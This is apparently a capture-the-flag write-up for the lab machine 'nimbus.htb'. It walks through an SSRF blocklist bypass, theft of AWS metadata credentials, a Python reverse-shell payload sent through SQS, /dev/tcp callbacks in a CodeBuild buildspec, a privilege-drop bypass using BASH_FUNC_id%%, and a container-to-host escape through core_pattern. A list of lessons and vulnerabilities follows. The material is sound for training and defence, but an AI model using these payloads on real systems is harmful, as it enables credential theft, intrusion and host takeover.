02

Phase 2: SSRF & IMDS Credential Theft

Probing the Blocklist

curl -s -X POST http://nimbus.htb/jobs/preview --data-urlencode "url=http://127.0.0.1/test.yaml"
curl -s -X POST http://nimbus.htb/jobs/preview --data-urlencode "url=http://169.254.169.254/test.yaml"
curl -s -X POST http://nimbus.htb/jobs/preview --data-urlencode "url=http://aws.nimbus.htb/test.yaml"

All three returned: "Security policy: this URL targets an internal resource and has been blocked."

This is a string-match blocklist, not an IP-resolution check — confirmed by testing alternate numeric encodings of the same loopback address:

curl -s -X POST http://nimbus.htb/jobs/preview --data-urlencode "url=http://0177.0.0.1/test.yaml"

Fetched successfully (real nginx 301 returned) — 0177.0.0.1 is octal for 127.0.0.1, resolves identically at the socket layer, but doesn't match the blocked string.

Reaching IMDS

169.254.169.254 in decimal is 2852039166:

curl -s -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode "url=http://2852039166/latest/meta-data/.yaml"

Returned the literal text Not Found — the exact response style of real AWS IMDS for an invalid path, confirming we're through.

A second, separate filter requires the URL string to end in .yaml/.yml. Real IMDS paths don't naturally end that way, so a query-string trick was used to satisfy the extension check without breaking the path:

curl -s -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode "url=http://2852039166/latest/meta-data/iam/security-credentials/?x=.yaml"
nimbus-web-role
curl -s -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode "url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=.yaml"
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "<redacted>",
  "SecretAccessKey": "<redacted>",
  "Token": "<redacted session token>",
  "Expiration": "2026-06-21T01:19:14Z"
}
Note on timing: these are temporary session credentials with a short lifetime (~10 minutes observed). The attacking box's clock should be roughly synced to the target's. ntpdate over UDP/123 won't work (no NTP service exposed) — instead, grab the target's time from its own HTTP Date: header and set it manually: 
curl -sI http://nimbus.htb/ | grep -i ^date
sudo date -u -s "<value from above>"
Why this matteredString-based SSRF blocklists are close to unenforceable — there are too many equivalent ways to write the same address. Only a validated, resolved-IP allowlist actually closes this class of bug.

A Dead End Worth Documenting: Port 9090

The health check pointed at aws.nimbus.htb. The hostname itself is blocked (case-insensitively, trailing-dot too). Probing loopback ports behind the IP encoding bypass turned up port 9090 returning what looked like a real AWS/LocalStack STS error:

curl -s -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode "url=http://0177.0.0.1:9090/test.yaml"
<ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>InvalidClientTokenId</Code>
    <Message>The security token included in the request is invalid.</Message>
  </Error>
  <RequestId>p7518495-adc4-1191-49n2-4m70d8sdf922</RequestId>
</ErrorResponse>

A significant amount of time was spent here trying to fix AWS SigV2/SigV4 signing against this endpoint (clock skew, percent-encoding stripped by the SSRF filter, host-header mismatches). None of it mattered — every single request to port 9090, regardless of payload, auth, or signature, returned this exact static response with the same RequestId every time. This port is a deliberate decoy, not a real service. The actual LocalStack instance lives elsewhere, reachable only from inside the worker container's own network namespace (see Phase 4).

Lesson: if a "service" returns byte-identical output (including request IDs that should be unique) regardless of input, stop debugging your payload — debug whether the service is real first.

Phase 3: Worker RCE & User Flag

The Vulnerable Sink

Eventually, source for the job worker (worker.py) was recovered, revealing:

job = yaml.load(body, Loader=yaml.Loader)   # UNSAFE — full loader
subprocess.run(["python3", "-c", job["script"]], ...)

The worker polls an SQS queue (nimbus-jobs) and blindly executes whatever string is in the script field via python3 -c. No deserialization gadget is even required — a plain string is enough.

Reaching the Queue

The nimbus-web-role credentials grant sqs:SendMessage on the queue. The real LocalStack/SQS endpoint, internally resolvable as floci:4566, is what actually processes these — not the port-9090 decoy.

nc -lvnp 4444
aws --endpoint-url http://floci:4566 sqs send-message \
  --queue-url http://floci:4566/847219365028/nimbus-jobs \
  --message-body 'name: pwn
script: |
  import socket,subprocess,os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("<kali vpn>",4444))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  subprocess.call(["/bin/sh","-i"])'
connect to [<kali vpn>] from (UNKNOWN) [<TARGET_IP>] 58166
worker@4af9e57afb84:/app$

User Flag

worker@4af9e57afb84:/app$ cat /home/*/user.txt
User Flag
Why this matteredAn unrestricted YAML loader paired with "then execute a field from it" is one of the most direct RCE primitives possible — worth flagging on sight in any code review.

IAM Permission Probing

From this foothold, the role's permissions were enumerated by trial and error. Denied:

iam:ListAttachedRolePolicies
ec2:DescribeInstances

Allowed (and load-bearing for the rest of the chain):

This narrowed the privesc path decisively toward CodeBuild once direct filesystem/SSM/EC2 routes were ruled out.

Phase 4: Privilege Escalation to Root

Identify the Real LocalStack Endpoint

Inside the worker container, /etc/hosts showed:

172.18.0.1      nimbus.htb
172.18.0.1      aws.nimbus.htb
172.18.0.3      4af9e57afb84

aws.nimbus.htb resolves internally to the Docker bridge gateway — not the real backend. The actual LocalStack service is reachable as floci:4566 on the worker's own network, confirmed via:

curl -s http://floci:4566/_localstack/health
{"edition":"community","services":{"sqs":"running","s3":"running","codebuild":"running", ...},"version":"1.5.17"}

Create a Privileged CodeBuild Project

import boto3
client = boto3.client("codebuild", endpoint_url="http://floci:4566", region_name="us-east-1")

response = client.create_project(
    name="exploit-1782000474",
    source={"type": "NO_SOURCE"},
    artifacts={"type": "NO_ARTIFACTS"},
    environment={
        "type": "LINUX_CONTAINER",
        "image": "floci/floci:latest",
        "computeType": "BUILD_GENERAL1_SMALL",
        "privilegedMode": True
    },
    serviceRole="arn:aws:iam::847219365028:role/nimbus-web-role"
)

Builds were then triggered remotely by writing a small Python payload to disk and dropping a queue message that exec()s it (kept code out of the SQS message body to avoid quoting/escaping issues):

aws --endpoint-url http://floci:4566 sqs send-message \
  --queue-url http://floci:4566/847219365028/nimbus-jobs \
  --message-body '{"name": "build", "script": "exec(open(\"/tmp/priv_shell.py\").read())"}'

Buildspec Debugging — Real Pitfalls Hit

Attempt 1 — instant fake "SUCCEEDED" with empty logs. Build completed in under a second with NO_SOURCE and zero log events. Root cause: the buildspec YAML had lost its indentation through a heredoc paste (phases:, build:, commands: all flush-left) — invalid nesting was silently treated as a no-op rather than erroring.

Fix — never trust heredocs for multi-line YAML in a copy-paste-heavy session; build it with printf and explicit \n, then verify with cat -A:

printf 'version: 0.2\nphases:\n  build:\n    commands:\n      - "exec 3<>/dev/tcp/<kali vpn>/4446"\n      - "echo PROOF: $(id) >&3"\n' > /tmp/build.yml
cat -A /tmp/build.yml

Attempt 2 — real parse error.

COMMAND_EXECUTION_ERROR: Failed to parse buildspec: while scanning for the
next token found character '%' that cannot start any token. (Do not use %
for indentation)

SnakeYAML treats an unescaped % in a plain scalar as a directive marker. The command printf "PROOF: %s\n" "$(id)" triggered this. Fix — quote the command string and avoid %-style printf entirely:

printf 'version: 0.2\nphases:\n  build:\n    commands:\n      - "exec 3<>/dev/tcp/<kali vpn>/4446"\n      - "echo PROOF: $(id) >&3"\n' > /tmp/build.yml

Attempt 3 — transient runtime error.

Exit code 128: OCI runtime exec failed: ... error executing setns process: exit status 1

Resolved itself on retry (container runtime contention from rapid repeated start_build calls).

BASH_FUNC_id%% — Defeating the Entrypoint's Privilege Drop

The floci/floci:latest image's entrypoint drops root before running build commands:

if [ "$(id -u)" = "0" ]; then
    exec gosu worker "$@"
fi

Bash supports importing function definitions through environment variables named BASH_FUNC_<name>%%. A function shadows any external binary of the same name in unqualified lookups — including inside the entrypoint script.

First attempt (wrong):

{"name": "BASH_FUNC_id%%", "value": "() { echo 0; }", "type": "PLAINTEXT"}

This still returns "0" from id -u, so the check passes and gosu still runs. Confirmed by the resulting log:

error: failed switching to "floci": operation not permitted

— gosu did attempt to run (and failed for an unrelated reason), proving the bypass logic itself was backwards.

Correct value — the function must return anything other than exactly "0":

{"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}

Now $(id -u) returns uid=1000, which doesn't equal "0", the check fails, and gosu is skipped entirely — the build commands run as the container's real root.

Why this matteredA security check implemented by shelling out to and parsing another command's output (here, id -u) can be hijacked by anything that controls the environment that command runs in — including function-shadowing tricks most reviewers wouldn't think to test.

Getting and Verifying the Root Shell

nc -lvnp 4447

response = client.start_build(
    projectName="exploit-1782000474",
    buildspecOverride=buildspec,
    environmentVariablesOverride=[
        {"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}
    ]
)
connect to [<kali vpn>] from (UNKNOWN) [<TARGET_IP>] 46148
[root@6d85ed3d5155 src]#

Because id itself is shadowed inside this shell, real UID has to be checked a different way:

[root@6d85ed3d5155 src]# cat /proc/self/status | grep ^Uid
Uid:    0       0       0       0
[root@6d85ed3d5155 src]# cat /proc/self/status | grep ^Cap
CapEff: 000001ffffffffff

Confirmed: full root, full capability set.

core_pattern Host Escape

With privilegedMode: true, the container has effectively the entire Linux capability set. /proc/sys/kernel/core_pattern is a global, non-namespaced kernel setting — writing to it from inside any sufficiently privileged container affects the host kernel's core-dump handling, not just the container's view of it.

Step 1 — find the container's writable layer on the host filesystem:

UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo "$UDIR"
# /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/178/fs

Step 2 — write the exploit script. Anything written here, on the host, also appears at / inside this container (it's the overlay's upperdir):

printf '#!/bin/sh\ncat /root/root.txt > %s/rootflag.txt\n' "$UDIR" > /exploit_root.sh
chmod +x /exploit_root.sh
cat /exploit_root.sh
#!/bin/sh
cat /root/root.txt > /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/178/fs/rootflag.txt

Step 3 — point the host kernel's core-dump handler at it:

echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern
cat /proc/sys/kernel/core_pattern
|/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/178/fs/exploit_root.sh

Step 4 — trigger a crash. Any SIGSEGV anywhere now causes the kernel to run our script, as real host root, outside every container namespace:

bash -c 'kill -11 $$'
sleep 2
cat /rootflag.txt
Root Flag
Why this matteredPrivileged containers effectively hand out host-adjacent root the moment an attacker can also write to non-namespaced kernel interfaces like the core-dump handler — a well-known but still very effective escape route.

07

Key Vulnerabilities

  1. SSRF blocklist using string matching instead of resolved-IP checks — trivially bypassed with octal/decimal IP notation.
  2. IMDS exposed with no SSRF defense-in-depth (no IMDSv2 token requirement / hop-limit) — single SSRF anywhere is a direct credential leak.
  3. Unsafe YAML deserialization combined with unsanitized subprocess.run — job["script"] from an untrusted queue message goes straight to python3 -c.
  4. Overly broad IAM policy — codebuild:* on a role that only needed queue access enabled the entire privesc path.
  5. privilegedMode: true on a CI/build backend — equivalent to handing out host-adjacent root the moment an attacker can also influence the entrypoint's privilege-drop logic.
  6. Privilege-drop logic that shells out to id — defeated by BASH_FUNC_id%%, a classic but still-effective environment-variable function-injection trick against any security check that depends on the output of an external command rather than a kernel-enforced primitive.
  7. No restriction on writing to /proc/sys/kernel/core_pattern from a privileged container — a well-known but still devastating container-to-host escape, since the kernel's core-dump handler runs completely outside container namespaces.
08

Lessons for Future CTFs

  • When an internal "service" returns identical output (including supposedly unique fields like request IDs) regardless of input, stop debugging your request and start questioning whether the service is even real.
  • Heredocs are unreliable for multi-line YAML/config content when working through a relayed shell — printf with explicit \n, verified with cat -A, is far more reliable.
  • Always verify privilege-bypass logic produces output that actually fails the target's comparison (e.g. BASH_FUNC_id%% must NOT return "0") — don't assume a fake function alone is sufficient without checking exactly what string the check compares against.
  • IAM permission denials are useful reconnaissance — systematically probing what's denied narrows the privesc surface to what's actually allowed.
